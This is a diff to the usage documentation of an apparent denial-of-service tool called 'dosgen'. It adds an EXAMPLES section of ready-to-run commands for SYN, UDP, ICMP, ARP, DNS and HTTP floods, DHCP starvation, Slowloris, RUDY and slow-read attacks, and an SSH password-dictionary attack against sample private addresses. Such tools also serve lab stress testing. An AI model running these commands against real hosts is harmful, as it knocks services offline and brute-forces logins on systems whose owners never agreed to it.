@@ -52,7 +52,7 @@ Attack types:
   * `--dns`:
     DNS flood
   * `--dhcp`:
-     DHCP starvation   
+     DHCP starvation
   * `--http`:
     HTTP flood
   * `--slowLoris`:
@@ -107,7 +107,21 @@ Definitions:
   * `-r`:
     amount of time before closing the socket (HTTP flood)
   * `-h`:
-    help, shows this message    
+    help, shows this message
+
+## EXAMPLES
+
+    dosgen -i eth1 -P 4 --syn -d 192.168.2.1 -D 80
+    dosgen -i eth1 -P 4 --rst -d 192.168.2.1 -D 80
+    dosgen -i eth1 -P 4 --udp -d 192.168.2.1 -D 80
+    dosgen -i eth1 -P 4 --icmp -d 192.168.2.1
+    dosgen -i eth1 -P 4 --arp -d 192.168.2.1
+    dosgen -i eth1 -P 4 --dns -d 192.168.2.1 -n www.google.com
+    dosgen -i eth1 -P 4 --dhcp
+    dosgen --slowLoris -d 10.0.0.10 -D 80 -c 300 -t 60 -T 320
+    dosgen --rudy -d 10.0.0.10 -D 80 -c 300 -t 60 -T 320 -p /form_action.php -P firstname
+    dosgen --slowRead -d 10.0.0.10 -D 80 -c 300 -T 320 -p /img1.jpg -w 50 -b 5 -n 1000
+    dosgen --ssh -d 10.0.0.10 -D 22 -u john -l /home/user/dict/johnripper.txt
 
 ## SEE ALSO
 
